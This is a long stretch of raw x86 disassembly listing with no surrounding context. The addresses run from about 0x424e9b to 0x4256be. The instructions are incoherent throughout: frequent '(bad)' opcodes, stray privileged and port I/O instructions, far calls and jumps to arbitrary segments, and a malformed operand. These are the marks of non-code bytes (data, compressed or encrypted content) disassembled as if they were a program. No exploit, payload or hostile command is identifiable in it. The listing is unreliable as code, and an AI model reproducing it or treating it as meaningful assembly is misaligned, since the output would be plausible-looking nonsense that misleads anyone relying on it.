  424e9b:	call   0xc335:0xb0d010d4
  424ea2:	xchg   ebx,eax
  424ea3:	and    al,0x92
  424ea5:	cs push 0x9e456c3a
  424eab:	(bad)  
  424eac:	sub    eax,0x7081e080
  424eb1:	cmp    eax,ecx
  424eb3:	data16 sub BYTE PTR [edi-0x18],ah
  424eb7:	mov    ds:0xf4975abd,al
  424ebc:	pop    esp
  424ebd:	add    BYTE PTR [eax+0x16],bl
  424ec0:	and    ah,dh
  424ec2:	adc    eax,0xb037db61
  424ec7:	pop    esi
  424ec8:	or     ebx,DWORD PTR [ebx+0x74]
  424ecb:	(bad)  
  424ecc:	push   edx
  424ecd:	dec    edi
  424ece:	hlt    
  424ecf:	adc    BYTE PTR [ebx-0x3d],bl
  424ed2:	or     ebx,DWORD PTR [esi-0x30]
  424ed5:	test   BYTE PTR [eax-0x40215000],dl
  424edb:	in     al,dx
  424edc:	add    BYTE PTR [ebx+0x6910555c],ch
  424ee2:	adc    esi,DWORD PTR [esp+esi*1-0x25]
  424ee6:	sbb    al,0x0
  424ee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ee9:	jno    0x424edb
  424eeb:	dec    esp
  424eec:	push   edx
  424eed:	push   esi
  424eee:	fdiv   DWORD PTR [esi-0x2a]
  424ef1:	mov    esi,0xbe225689
  424ef6:	mov    ds:0x39141656,al
  424efb:	add    BYTE PTR [ebp+0x63],dh
  424efe:	push   edx
  424eff:	add    dl,al
  424f01:	mov    bl,0x5
  424f03:	mov    dh,0xe1
  424f05:	mov    eax,DWORD PTR [eax]
  424f07:	pushf  
  424f08:	inc    esp
  424f09:	dec    esp
  424f0a:	push   cs
  424f0b:	pop    esi
  424f0c:	cmp    al,0x19
  424f0e:	xchg   ecx,eax
  424f0f:	mov    BYTE PTR [eax+0x6d1c0b64],bh
  424f15:	mov    al,0x5
  424f17:	xor    al,0x4c
  424f19:	pushf  
  424f1a:	lods   al,BYTE PTR ss:[esi]
  424f1c:	push   edx
  424f1d:	call   0x522109f8
  424f22:	sbb    dl,BYTE PTR [esp+ebp*2-0x26]
  424f26:	inc    esp
  424f27:	add    bh,ch
  424f29:	xor    al,bh
  424f2b:	adc    BYTE PTR [edx-0x557d5148],bl
  424f31:	xchg   BYTE PTR [ecx],ah
  424f33:	push   cs
  424f34:	neg    BYTE PTR [ebp+edi*8-0x4f55855e]
  424f3b:	mov    al,ds:0x12e4c745
  424f40:	push   es
  424f41:	hlt    
  424f42:	lds    esp,FWORD PTR [edx-0x3a]
  424f45:	add    al,0xeb
  424f47:	in     eax,dx
  424f48:	jo     0x424efe
  424f4a:	int    0x14
  424f4c:	mov    BYTE PTR [ebp+0x1e842efc],ch
  424f52:	xchg   esi,eax
  424f53:	push   0x42e86bfe
  424f58:	xchg   edx,edi
  424f5a:	push   esp
  424f5b:	xor    eax,esi
  424f5d:	out    0x86,al
  424f5f:	into   
  424f60:	jl     0x424f0c
  424f62:	mov    dh,0xc0
  424f64:	ss call 0xa86abb53
  424f6a:	repnz scas eax,DWORD PTR es:[edi]
  424f6c:	mov    eax,0x8e5d2432
  424f71:	inc    ebp
  424f72:	mov    ?,WORD PTR [ebp-0x4345c1a6]
  424f78:	(bad)  
  424f79:	es in  eax,dx
  424f7b:	mov    ch,0x1d
  424f7d:	add    eax,0x42a00005
  424f82:	rol    BYTE PTR [eax+eiz*2-0x4ebd6bd6],0xc1
  424f8a:	ss aaa 
  424f8c:	inc    esi
  424f8d:	daa    
  424f8e:	add    al,dh
  424f90:	inc    edi
  424f91:	push   ds
  424f92:	and    bl,BYTE PTR [esi-0x491e2891]
  424f98:	mov    eax,ds:0x41fefa41
  424f9d:	bound  edi,QWORD PTR [edi+0xb76aa5]
  424fa3:	aaa    
  424fa4:	int    0xb1
  424fa6:	mov    ds:0x129e0ea0,al
  424fab:	xor    DWORD PTR [esi],edx
  424fad:	xchg   esp,eax
  424fae:	dec    esi
  424faf:	jmp    0x1d45:0xb40284e2
  424fb6:	mov    dl,BYTE PTR [edi]
  424fb8:	outs   dx,BYTE PTR ds:[esi]
  424fb9:	ins    DWORD PTR es:[edi],dx
  424fba:	sub    al,0x94
  424fbc:	repz adc BYTE PTR [eax],0x60
  424fc0:	imul   eax,DWORD PTR [edx-0x562fcf50],0x3a
  424fc7:	shl    esp,1
  424fc9:	fs mov ebx,0x7e28ac6c
  424fcf:	lahf   
  424fd0:	mov    esi,0xe8df5b
  424fd5:	dec    ebp
  424fd6:	inc    ecx
  424fd7:	sub    esi,DWORD PTR [eax-0x2e3b63e3]
  424fdd:	sbb    al,0x90
  424fdf:	sub    DWORD PTR [edx+eax*4+0x6c3b013c],ebp
  424fe6:	inc    ecx
  424fe7:	pop    ds
  424fe8:	and    al,0x1e
  424fea:	mov    WORD PTR [eax+eax*1],es
  424fed:	iret   
  424fee:	jp     0x424ffb
  424ff0:	call   0x361c:0x76120549
  424ff7:	js     0x424fdf
  424ff9:	or     BYTE PTR [esi+0x95eaeaa],al
  424fff:	lahf   
  425000:	fisub  DWORD PTR [eax]
  425002:	lock cdq 
  425004:	cwde   
  425005:	mov    eax,ds:0x9ab5a2a2
  42500a:	lods   al,BYTE PTR ds:[esi]
  42500b:	lea    edi,[edx]
  42500d:	rol    DWORD PTR [edx*1+0x228659dc],cl
  425014:	repz mov dh,0x4a
  425017:	fdivr  QWORD PTR [edi-0x78]
  42501a:	daa    
  42501b:	add    bh,ah
  42501d:	stos   DWORD PTR es:[edi],eax
  42501e:	adc    al,0x6c
  425020:	add    ch,BYTE PTR [esi-0x4327887a]
  425026:	ret    0x667c
  425029:	or     BYTE PTR [eax],dl
  42502b:	add    BYTE PTR ds:0x65c24fe6,ch
  425031:	xor    al,0xb4
  425033:	mov    ds:0x9a9562c8,al
  425038:	fisubr WORD PTR [esi-0x2b]
  42503b:	inc    eax
  42503c:	loopne 0x425070
  42503e:	or     BYTE PTR [esi-0x38],bh
  425041:	add    BYTE PTR [edx-0x7f],bl
  425044:	bound  ebp,QWORD PTR [ebx-0x53]
  425047:	mov    ds:0x58ec101b,al
  42504c:	pop    eax
  42504d:	hlt    
  42504e:	iret   
  42504f:	jle    0x425015
  425051:	mov    ds:0x438ec740,al
  425056:	xchg   esp,eax
  425057:	aam    0x2a
  425059:	cmp    DWORD PTR [ebx],eax
  42505b:	push   ds
  42505c:	push   esp
  42505d:	stos   BYTE PTR es:[edi],al
  42505e:	outs   dx,DWORD PTR ds:[esi]
  42505f:	mov    al,ds:0xb7f3a029
  425064:	or     BYTE PTR [edi],ah
  425066:	dec    eax
  425067:	rol    DWORD PTR [edx],1
  425069:	rol    DWORD PTR [esi+0x5366f83c],0xcc
  425070:	jb     0x42505c
  425072:	mov    dh,0xda
  425074:	fadd   DWORD PTR [esi+0x5f9c0282]
  42507a:	in     al,0xb6
  42507c:	ds mov ebp,0xa65a04a
  425082:	sub    dl,BYTE PTR [esi]
  425084:	nop
  425085:	pop    ebp
  425086:	popa   
  425087:	fs retf 
  425089:	test   al,0x65
  42508b:	push   esi
  42508c:	adc    al,0x34
  42508e:	fld    TBYTE PTR [esi+0x7a]
  425091:	scas   eax,DWORD PTR es:[edi]
  425092:	sbb    al,0xbe
  425094:	mov    ebx,0xbff43618
  425099:	jnp    0x42506c
  42509b:	xor    DWORD PTR [esi-0x48],0x6ed3b41a
  4250a2:	fisubr WORD PTR [ecx+0x56a454ce]
  4250a8:	push   ebx
  4250a9:	xlat   BYTE PTR ds:[ebx]
  4250aa:	xor    al,0xda
  4250ac:	cmp    ch,BYTE PTR [eax-0x2e]
  4250af:	data16 fisub DWORD PTR [ecx+0x5a]
  4250b3:	sbb    bh,BYTE PTR [eax-0x4abdb96b]
  4250b9:	add    DWORD PTR [esi-0x4a2a2ed8],esp
  4250bf:	mov    ch,0x2f
  4250c1:	jbe    0x425094
  4250c3:	(bad)  
  4250c4:	and    bl,BYTE PTR [edi]
  4250c6:	sbb    ch,BYTE PTR [eax-0x7f078856]
  4250cc:	push   esp
  4250cd:	push   eax
  4250ce:	hlt    
  4250cf:	cdq    
  4250d0:	jb     0x4250dd
  4250d2:	pop    edx
  4250d3:	ins    DWORD PTR es:[edi],dx
  4250d4:	or     al,0x6d
  4250d6:	xchg   edi,eax
  4250d7:	sub    eax,0x4acac1e
  4250dc:	enter  0xaa33,0x7c
  4250e0:	loopne 0x425074
  4250e2:	cmp    cl,BYTE PTR [edx]
  4250e4:	mov    ch,BYTE PTR [edx]
  4250e6:	dec    esp
  4250e7:	imul   ecx,eax,0x966730db
  4250ed:	out    0x2a,eax
  4250ef:	sub    dl,BYTE PTR [ebx+ecx*1]
  4250f2:	sbb    BYTE PTR [esi+eiz*1-0x4dc3d7a8],dl
  4250f9:	adc    al,0xba
  4250fb:	dec    esp
  4250fc:	inc    ebp
  4250fd:	mov    esi,DWORD PTR [eax+0x76ed8cd]
  425103:	and    dh,dl
  425105:	adc    DWORD PTR [esi],0x34d68ad8
  42510b:	fidiv  WORD PTR [esi-0x1d]
  42510e:	mov    eax,0x8aeeabc0
  425113:	push   0xae556e39
  425118:	int    0x1c
  42511a:	mov    al,ds:0x12e0e5be
  42511f:	cmp    DWORD PTR [esi+ebx*8+0x22],0x0
  425124:	pop    ebp
  425125:	dec    ebp
  425126:	xchg   ebp,eax
  425127:	xor    bh,BYTE PTR [esi-0x4feca1b5]
  42512d:	jnp    0x425144
  42512f:	inc    ebp
  425130:	adc    eax,0xdc95ea05
  425135:	xchg   DWORD PTR [edx+0x30],edi
  425138:	dec    esp
  425139:	cmp    dl,BYTE PTR [ebx]
  42513b:	lods   eax,DWORD PTR ds:[esi]
  42513c:	test   al,0xb0
  42513e:	test   BYTE PTR [esp+eax*1+0x694e1cd1],dl
  425145:	xor    cl,BYTE PTR [esi+0x6caad0df]
  42514b:	cmp    ch,BYTE PTR [ebx+0x4c]
  42514e:	sbb    BYTE PTR [edi],bl
  425150:	les    esi,FWORD PTR [eax+0xe97ab6]
  425156:	lds    edx,FWORD PTR ds:0x682f3581
  42515c:	mov    eax,0x4f6697
  425161:	dec    ecx
  425162:	frstor [esi+ebp*1+0xd6ae818]
  425169:	jg     0x42518b
  42516b:	jno    0x42516d
  42516d:	hlt    
  42516e:	mov    ebx,0x11a5200
  425173:	out    dx,al
  425174:	cmp    DWORD PTR [esi+0x60122884],ebx
  42517a:	stos   DWORD PTR es:[edi],eax
  42517b:	mov    BYTE PTR [esp+eiz*2+0x325258a4],ch
  425182:	adc    BYTE PTR [edi-0x14],0xea
  425186:	jmp    0x3dbc:0xaf329e00
  42518d:	xchg   esp,eax
  42518e:	push   ss
  42518f:	mov    al,ds:0x4d4d1100
  425194:	push   es
  425195:	xor    eax,0xee9a1aaa
  42519a:	and    dl,BYTE PTR ds:0xaa45150d
  4251a0:	mov    esi,0x1ca92c6c
  4251a5:	ins    DWORD PTR es:[edi],dx
  4251a6:	stos   BYTE PTR es:[edi],al
  4251a7:	sbb    ah,BYTE PTR [eax-0x15]
  4251aa:	mov    al,0x8a
  4251ac:	das    
  4251ad:	fdiv   QWORD PTR [edx]
  4251af:	call   0x51d3:0xad041bea
  4251b6:	inc    ebx
  4251b7:	adc    DWORD PTR ds:0xcc0a285e,0xe09d6e7e
  4251c1:	push   cs
  4251c2:	sbb    ebp,DWORD PTR [ecx+eiz*2+0x7302ed07]
  4251c9:	inc    esi
  4251ca:	mov    al,0xe2
  4251cc:	inc    ebp
  4251cd:	sub    eax,0xd47d8341
  4251d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251d3:	arpl   si,ax
  4251d5:	aad    0xe2
  4251d7:	xor    al,0xe0
  4251d9:	mov    esp,0x1435a06
  4251de:	ins    BYTE PTR es:[edi],dx
  4251df:	mov    ecx,0xa25e4cef
  4251e4:	push   eax
  4251e5:	add    edi,DWORD PTR [edi+ebp*2+0x7]
  4251e9:	loope  0x425216
  4251eb:	call   0xa6:0x52702a2e
  4251f2:	inc    edx
  4251f3:	mov    esp,0xa8aaac0
  4251f8:	adc    eax,eax
  4251fa:	push   ds
  4251fb:	mov    ds:0x9ad19cf6,al
  425200:	push   es
  425201:	shr    DWORD PTR [eax],1
  425203:	fidivr WORD PTR [eax]
  425205:	sbb    dh,ah
  425207:	lock jo 0x425198
  42520a:	fcom   DWORD PTR [ecx+0x50]
  42520d:	aam    0x4e
  42520f:	aas    
  425210:	add    ah,BYTE PTR [ebp-0x6b09d334]
  425216:	aas    
  425217:	sub    BYTE PTR [edx],0xd5
  42521a:	es inc edx
  42521c:	fs xchg ebp,eax
  42521e:	mov    ecx,0xa8fa9cc0
  425223:	(bad)  
  425225:	mov    es,WORD PTR [edx+0x3cd3f07b]
  42522b:	jbe    0x42529a
  42522d:	hlt    
  42522e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42522f:	fcomp  QWORD PTR [edx+0x0]
  425232:	and    eax,0xd4d0005b
  425237:	sbb    bl,BYTE PTR [edx-0x25c7a550]
  42523d:	dec    esp
  42523e:	sub    DWORD PTR [esi],ebp
  425240:	push   edi
  425241:	mov    BYTE PTR [eax+0x5c8a568a],al
  425247:	pop    eax
  425248:	and    edx,DWORD PTR [edx-0x80]
  42524b:	out    dx,al
  42524c:	mov    eax,ds:0x143475a0
  425251:	fdivrp st(0),st
  425253:	mov    ebx,0x8242ad58
  425258:	or     al,0x14
  42525a:	dec    ecx
  42525b:	mov    al,0xbc
  42525d:	mov    edi,0x87f22a1b
  425262:	lods   eax,DWORD PTR ds:[esi]
  425263:	mov    al,ds:0xf6a46b15
  425268:	int    0xee
  42526a:	jo     0x425232
  42526c:	or     DWORD PTR [edx],ecx
  42526e:	mov    bl,0xd
  425270:	add    eax,0xcf1d6
  425275:	xchg   edx,eax
  425276:	lods   eax,DWORD PTR ds:[esi]
  425277:	pop    edx
  425278:	scas   al,BYTE PTR es:[edi]
  425279:	push   0xffffff9c
  42527b:	dec    eax
  42527c:	add    al,BYTE PTR [ecx+0x5b452e8]
  425282:	mov    BYTE PTR [ebp-0x3],0x7c
  425286:	lea    ebx,[esi+0x5c]
  425289:	ja     0x4252ef
  42528b:	ins    DWORD PTR es:[edi],dx
  42528c:	test   ebp,ebp
  42528e:	add    BYTE PTR [edi],dh
  425290:	mov    dh,0xb8
  425292:	fs icebp 
  425294:	ds jbe 0x425271
  425297:	mov    eax,0xd5d68e81
  42529c:	or     bh,BYTE PTR [edx+0x38]
  42529f:	shl    BYTE PTR [edx],1
  4252a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4252a2:	ss stc 
  4252a4:	test   eax,0x603ac0a9
  4252a9:	add    ebp,DWORD PTR [eax]
  4252ab:	mov    edx,0x6c5db205
  4252b0:	mov    bl,0xb6
  4252b2:	mov    ds:0x7da6ccf4,al
  4252b7:	push   0xfae2509a
  4252bc:	cmp    al,0x4f
  4252be:	mov    esi,0xd55852f5
  4252c3:	xor    BYTE PTR [edi],0x84
  4252c6:	dec    edi
  4252c7:	ds or  al,0xbd
  4252ca:	mov    dl,0xaa
  4252cc:	pop    si
  4252ce:	rol    BYTE PTR [esi+0x415a42],1
  4252d4:	loopne 0x4252d6
  4252d6:	inc    esi
  4252d7:	ret    
  4252d8:	push   es
  4252d9:	jne    0x425290
  4252db:	mov    cl,BYTE PTR [esi+0x709d4275]
  4252e1:	in     eax,0x16
  4252e3:	push   edi
  4252e4:	add    dl,BYTE PTR [edx-0x7e]
  4252e7:	push   edi
  4252e8:	xor    al,0x34
  4252ea:	inc    eax
  4252eb:	mov    esp,0x2fd0c57a
  4252f0:	test   eax,0x43f03500
  4252f5:	rol    DWORD PTR [esi-0x37e1b856],0x92
  4252fc:	mov    ds:0x8c82434,eax
  425301:	ss pop ecx
  425303:	rol    DWORD PTR [edx],0x66
  425306:	fdivr  QWORD PTR [ecx+0x12]
  425309:	xor    dl,dh
  42530b:	dec    esp
  42530c:	mov    ch,0x82
  42530e:	inc    esp
  42530f:	mov    ah,0xa
  425311:	imul   esi,eax,0xffffffca
  425314:	cs pop ds
  425316:	pop    eax
  425317:	sbb    BYTE PTR [eax+eiz*4-0x1db3bd5e],dh
  42531e:	shr    DWORD PTR [esi],cl
  425320:	sub    eax,DWORD PTR [edx-0x2a]
  425323:	mov    edi,0x4aaa5430
  425328:	dec    edx
  425329:	mov    ds:0x1ab5c226,al
  42532e:	push   edi
  42532f:	xchg   ebx,eax
  425330:	push   0x8863da6b
  425335:	imul   edi,DWORD PTR [ebx],0xe
  425338:	cmp    bl,BYTE PTR [ebx+0x7a]
  42533b:	popa   
  42533c:	push   0x43
  42533e:	push   ecx
  42533f:	leave  
  425340:	and    BYTE PTR [edi+0x3e],ah
  425343:	xchg   ebp,eax
  425344:	rcl    cl,0x62
  425347:	add    DWORD PTR [ecx-0x66],0xe2274898
  42534e:	out    dx,eax
  42534f:	jg     0x425322
  425351:	pop    esi
  425352:	push   eax
  425353:	push   ebp
  425354:	cmp    al,BYTE PTR [ecx-0x6b6955be]
  42535a:	js     0x42535c
  42535c:	call   0x82cc8207
  425361:	add    bl,bl
  425363:	test   dl,ah
  425365:	(bad)  
  425366:	sub    BYTE PTR [edx+0x3a9700de],ah
  42536c:	push   es
  42536d:	mov    esp,0x2e1a443
  425372:	xchg   bx,ax
  425374:	jo     0x425376
  425376:	jb     0x4253f0
  425378:	adc    eax,0x1c151505
  42537d:	jmp    0x694f0bce
  425382:	or     bl,BYTE PTR [ebp+0x15820545]
  425388:	cs icebp 
  42538a:	mov    ah,0x1e
  42538c:	mov    bh,al
  42538e:	xor    bh,BYTE PTR [ecx]
  425390:	ins    BYTE PTR es:[edi],dx
  425391:	xor    al,0x61
  425393:	dec    ebp
  425394:	jo     0x42534b
  425396:	inc    eax
  425397:	repnz and al,0x7b
  42539a:	cwde   
  42539b:	mul    al
  42539d:	inc    ecx
  42539e:	js     0x425348
  4253a0:	nop
  4253a1:	push   ds
  4253a2:	push   ss
  4253a3:	shl    BYTE PTR [esi-0x7fca5220],0x19
  4253aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253ab:	sbb    al,0x58
  4253ad:	ins    DWORD PTR es:[edi],dx
  4253ae:	xchg   esi,eax
  4253af:	add    BYTE PTR [eax+0x24],al
  4253b2:	pop    es
  4253b3:	push   es
  4253b4:	inc    ecx
  4253b5:	aam    0xda
  4253b7:	scas   al,BYTE PTR es:[edi]
  4253b8:	xor    dh,BYTE PTR [eax+0x4c]
  4253bb:	mov    dl,0x9e
  4253bd:	push   cs
  4253be:	test   BYTE PTR ds:0xd8056aa8,al
  4253c4:	je     0x42539c
  4253c6:	hlt    
  4253c7:	push   ds
  4253c8:	mov    edx,0x28dcd894
  4253cd:	mov    al,0xaa
  4253cf:	push   ebp
  4253d0:	test   BYTE PTR ds:0x941a3cfa,al
  4253d6:	fimul  DWORD PTR [edx+0x559a9ad6]
  4253dc:	cli    
  4253dd:	into   
  4253de:	inc    esi
  4253df:	sub    BYTE PTR [esi+esi*8-0x34c5f54b],0x16
  4253e7:	xor    eax,0xbd0ade39
  4253ec:	clc    
  4253ed:	or     bl,ah
  4253ef:	jbe    0x42539b
  4253f1:	stos   DWORD PTR es:[edi],eax
  4253f2:	adc    dl,BYTE PTR [esi+edi*8+0x674ab302]
  4253f9:	lods   eax,DWORD PTR ds:[esi]
  4253fa:	rol    DWORD PTR [eax],0xa2
  4253fd:	nop
  4253fe:	aam    0xf6
  425400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425402:	mov    BYTE PTR [esi+0x70],dh
  425405:	or     DWORD PTR [ebp+0x4d],ecx
  425408:	cmp    ah,BYTE PTR [ebp+0x70]
  42540b:	ret    0xc460
  42540e:	out    0x2f,al
  425410:	test   al,0xfa
  425412:	jmp    0x4253e0
  425414:	mov    dh,0x6c
  425416:	add    BYTE PTR [esi],cl
  425418:	dec    ebp
  425419:	add    BYTE PTR [ecx+0x28],cl
  42541c:	xlat   BYTE PTR ds:[ebx]
  42541d:	xchg   BYTE PTR [ebp-0x6f],cl
  425420:	mov    ebp,0x6aa81d00
  425425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425426:	jbe    0x425416
  425428:	jbe    0x42545c
  42542a:	call   0xdff6c85f
  42542f:	and    al,bl
  425431:	mov    ah,0x92
  425433:	jp     0x42546b
  425435:	pop    ebx
  425436:	scas   eax,DWORD PTR es:[edi]
  425437:	jmp    0x8c49:0x640ad10
  42543e:	(bad)  
  42543f:	xchg   esp,eax
  425440:	pop    edx
  425441:	xor    eax,0xc1ef001c
  425446:	sub    edi,DWORD PTR [esi-0x4cb4080]
  42544c:	cs cmp ch,al
  42544f:	add    ah,bh
  425451:	scas   al,BYTE PTR es:[edi]
  425452:	ss xor eax,0x3408633c
  425458:	mov    ds:0xfa1abcd8,al
  42545d:	mov    dx,0xe86b
  425461:	mov    al,0xcd
  425463:	push   0xffffffd0
  425465:	stos   BYTE PTR es:[edi],al
  425466:	adc    BYTE PTR [esp+ecx*1-0x5f1a7953],0x44
  42546e:	inc    edi
  42546f:	inc    ebx
  425470:	inc    edi
  425471:	aas    
  425472:	push   esp
  425473:	xlat   BYTE PTR ds:[ebx]
  425474:	jp     0x4254ed
  425476:	js     0x425432
  425478:	sbb    ch,BYTE PTR [edx]
  42547a:	adc    al,0x45
  42547c:	xchg   edx,eax
  42547d:	add    al,0x40
  42547f:	mov    esi,0xe1e72c8b
  425484:	push   0x6f120b6a
  425489:	sbb    DWORD PTR [edx],edi
  42548b:	pusha  
  42548c:	mov    fs:0x2d9a800,al
  425492:	pop    ebx
  425493:	dec    esp
  425494:	push   0x37
  425496:	cmp    BYTE PTR [eax+0x9],0x56
  42549a:	or     dl,BYTE PTR [edx+0x39]
  42549d:	lods   eax,DWORD PTR ds:[esi]
  42549e:	mov    ds:0xf162a0a1,al
  4254a3:	dec    eax
  4254a4:	out    dx,al
  4254a5:	sahf   
  4254a6:	dec    ebp
  4254a7:	inc    eax
  4254a8:	mov    bh,0xee
  4254aa:	adc    esp,DWORD PTR [eax]
  4254ac:	adc    al,0xd
  4254ae:	sub    ah,0xd8
  4254b1:	push   0x859eca79
  4254b6:	mov    ds,WORD PTR ds:0x60062f7c
  4254bc:	sub    cl,BYTE PTR cs:[edx+eax*4+0x4e3b66a2]
  4254c4:	and    DWORD PTR [ecx+0x6225b8ca],esp
  4254ca:	lahf   
  4254cb:	xor    BYTE PTR [edx],cl
  4254cd:	call   0x8d00:0xf945f8a6
  4254d4:	cmp    DWORD PTR [eax+0x663ea7c4],0xffffffdb
  4254db:	push   ss
  4254dc:	sbb    bh,BYTE PTR [edx]
  4254de:	or     bh,BYTE PTR [eax-0x44]
  4254e1:	int3   
  4254e2:	sub    BYTE PTR [eax+edx*1+0x286883ea],cl
  4254e9:	jbe    0x42554c
  4254eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254ec:	sub    BYTE PTR [eax-0x4f],bh
  4254ef:	inc    ebx
  4254f0:	jnp    0x42549e
  4254f2:	lods   eax,DWORD PTR ds:[esi]
  4254f3:	adc    dl,BYTE PTR [edx+0x6693d182]
  4254f9:	jno    0x425530
  4254fb:	lods   al,BYTE PTR ds:[esi]
  4254fc:	fnstsw ax
  4254fe:	inc    ebp
  4254ff:	imul   esp,esi,0x7f
  425502:	cmc    
  425503:	add    ah,dh
  425505:	sub    al,0x0
  425507:	fs jo  0x42550a
  42550a:	push   edi
  42550b:	mov    al,0x10
  42550d:	cli    
  42550e:	dec    esp
  42550f:	mov    ecx,0x6caa2abe
  425514:	inc    ecx
  425515:	iret   
  425516:	jle    0x425595
  425518:	in     eax,dx
  425519:	jl     0x4254f3
  42551b:	jp     0x4254ed
  42551d:	add    eax,ebx
  42551f:	inc    esp
  425520:	sbb    ebp,DWORD PTR [edx-0x48436abe]
  425526:	icebp  
  425527:	and    BYTE PTR [esi],ch
  425529:	mov    ebx,0xe0b151b3
  42552e:	nop
  42552f:	push   ss
  425530:	fidiv  DWORD PTR [edx+0x43]
  425533:	mov    ds:0x48a9184c,eax
  425538:	mov    ah,0xc8
  42553a:	fidiv  WORD PTR [eax-0x7991cc3e]
  425540:	js     0x4254f3
  425542:	mov    al,ds:0xced0a2a9
  425547:	mov    DWORD PTR cs:[eax-0x74c71514],edi
  42554e:	pinsrw mm4,WORD PTR [esi-0x61],0x36
  425553:	or     dl,bh
  425555:	sub    al,ch
  425557:	daa    
  425558:	mov    dl,0x2
  42555a:	repz jmp 0x42558f
  42555d:	mov    ah,0x45
  42555f:	dec    edx
  425560:	lea    eax,[edi-0x6]
  425563:	iret   
  425564:	xchg   BYTE PTR [eax-0x42],ch
  425567:	and    al,BYTE PTR [edx]
  425569:	mov    dh,0x82
  42556b:	xor    BYTE PTR [eax],0xa9
  42556e:	add    BYTE PTR [ebx+0x10],ah
  425571:	xor    ebp,DWORD PTR [esi+eax*4]
  425574:	inc    edi
  425575:	lods   eax,DWORD PTR ds:[esi]
  425576:	cmp    dh,ch
  425578:	(bad)  
  425579:	cli    
  42557a:	ins    DWORD PTR es:[edi],dx
  42557b:	xor    eax,0x1a9e91d8
  425580:	push   ss
  425581:	xor    al,0xc0
  425583:	cwde   
  425584:	adc    bh,0xf5
  425587:	test   BYTE PTR [ecx+0x56fada57],bh
  42558d:	adc    al,0x74
  42558f:	cmp    DWORD PTR [esp+ebp*1+0x59],ebp
  425593:	xchg   esi,eax
  425594:	mov    edi,0x2efc0176
  425599:	mov    ch,0xca
  42559b:	aad    0x4c
  42559d:	call   0x2c6161b0
  4255a2:	outs   dx,BYTE PTR ds:[esi]
  4255a3:	push   ss
  4255a4:	mov    dl,0xe6
  4255a6:	or     eax,0x176f349b
  4255ab:	out    0x65,al
  4255ad:	add    BYTE PTR ds:0x60405d0c,cl
  4255b3:	push   ebx
  4255b4:	jmp    0x4255de
  4255b6:	push   esi
  4255b7:	add    ebx,DWORD PTR [eax]
  4255b9:	vpermt2b zmm5,zmm1,DWORD PTR [edi+0x2c3e9b44]{1to16}
  4255c3:	xchg   esp,eax
  4255c4:	inc    ecx
  4255c5:	(bad)  
  4255c6:	fidivr DWORD PTR [ebx+0x14ab1002]
  4255cc:	mov    ebx,0xf459ec5c
  4255d1:	scas   al,BYTE PTR es:[edi]
  4255d2:	sbb    eax,0x83b0436f
  4255d7:	sbb    BYTE PTR [edx],dl
  4255d9:	cmp    al,0x37
  4255db:	retf   
  4255dc:	or     al,0xd
  4255de:	mov    dh,0xa3
  4255e0:	mov    al,ds:0xc18a5cc
  4255e5:	scas   al,BYTE PTR es:[edi]
  4255e6:	mov    bh,0x1f
  4255e8:	mov    eax,0x55a41e62
  4255ed:	add    eax,0xb42f0005
  4255f2:	stos   DWORD PTR es:[edi],eax
  4255f3:	pushf  
  4255f4:	xor    eax,0xeb02f0f
  4255f9:	mov    bh,0x12
  4255fb:	mov    edx,0x1c001c03
  425600:	add    al,0x0
  425602:	xlat   BYTE PTR ds:[ebx]
  425603:	mov    ds:0x1fe686a2,al
  425608:	add    BYTE PTR [ebp-0x5e],dh
  42560b:	push   cs
  42560c:	sub    edx,DWORD PTR [eax+0x20]
  42560f:	and    BYTE PTR [esi],dh
  425611:	adc    al,0x28
  425613:	mov    dh,0x3f
  425615:	mov    dh,ah
  425617:	push   ss
  425618:	and    dh,al
  42561a:	loope  0x425678
  42561c:	lahf   
  42561d:	and    dl,BYTE PTR [ebp+esi*1+0x54]
  425621:	or     BYTE PTR [eax],dh
  425623:	loop   0x4255f3
  425625:	push   eax
  425626:	or     eax,DWORD PTR [eax]
  425628:	mov    edx,0x35a3b6aa
  42562d:	adc    DWORD PTR es:[ecx+ebp*8+0x64995f36],0x456dc625
  425639:	add    eax,0xf6bc8a1d
  42563e:	psubb  mm4,mm3
  425641:	add    al,0xc0
  425643:	or     BYTE PTR [ebp+0x3a5c3],bh
  425649:	fidivr WORD PTR [esi]
  42564b:	nop
  42564c:	dec    ebx
  42564d:	pop    esi
  42564e:	add    BYTE PTR [esi+esi*4-0x1dcacb8b],dh
  425655:	imul   esi
  425657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425658:	and    al,0x25
  42565a:	add    al,0x7c
  42565c:	xor    ecx,DWORD PTR [eax+0x55b0ea28]
  425662:	nop
  425663:	pop    ds
  425664:	dec    ebx
  425665:	cli    
  425666:	sub    bh,BYTE PTR [ecx-0x57784a92]
  42566c:	add    ch,BYTE PTR [eax+0x50]
  42566f:	gs and al,0xfb
  425672:	or     BYTE PTR [eax+0x62],bh
  425675:	xchg   ecx,eax
  425676:	push   0x51
  425678:	xchg   ecx,eax
  425679:	and    BYTE PTR [edx-0x17],dl
  42567c:	pusha  
  42567d:	mov    esp,0xc10afeda
  425682:	xchg   BYTE PTR [ebx],cl
  425684:	mov    bl,ah
  425686:	cmp    BYTE PTR [edx],al
  425688:	xchg   esp,eax
  425689:	lock or dl,BYTE PTR ds:0x57b6c2ad
  425690:	sbb    BYTE PTR [eax],0x85
  425693:	mov    dl,0x76
  425695:	push   esi
  425696:	pop    esi
  425697:	or     al,0xa0
  425699:	xchg   ebp,eax
  42569a:	pop    edx
  42569b:	sub    esi,DWORD PTR [eax+0x2]
  42569e:	push   esp
  42569f:	sar    bl,cl
  4256a1:	pop    eax
  4256a2:	inc    ebp
  4256a3:	mov    ss,ebx
  4256a5:	rcl    cl,1
  4256a7:	pusha  
  4256a8:	sbb    ebp,DWORD PTR [ebp*8-0x18c1655e]
  4256af:	pop    edx
  4256b0:	and    dl,BYTE PTR ds:0xba5b02b4
  4256b6:	add    esi,DWORD PTR [edi+0x46f27252]
  4256bc:	jnp    0x4256b4
  4256be:	sar    DWORD PTR [ecx],1
